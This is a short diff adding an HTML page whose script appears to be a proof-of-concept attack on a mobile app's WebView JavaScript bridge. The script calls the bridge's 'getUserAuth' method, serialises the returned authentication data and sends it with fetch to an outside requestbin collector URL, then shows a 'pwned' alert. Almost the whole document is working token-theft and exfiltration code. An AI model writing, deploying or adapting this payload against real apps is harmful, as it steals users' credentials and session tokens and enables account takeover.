@@ -1,0 +1,10 @@
+<html>
+<script>
+ dsBridge.call("getUserAuth", function(result) {
+    var token = JSON.stringify(result);
+    var webhook = "http://requestbin.whapi.cloud/1d5zjo41";
+    fetch(webhook + encodeURIComponent(token), {mode: 'no-cors'});
+    alert("pwned");
+});
+</script>
+</html>
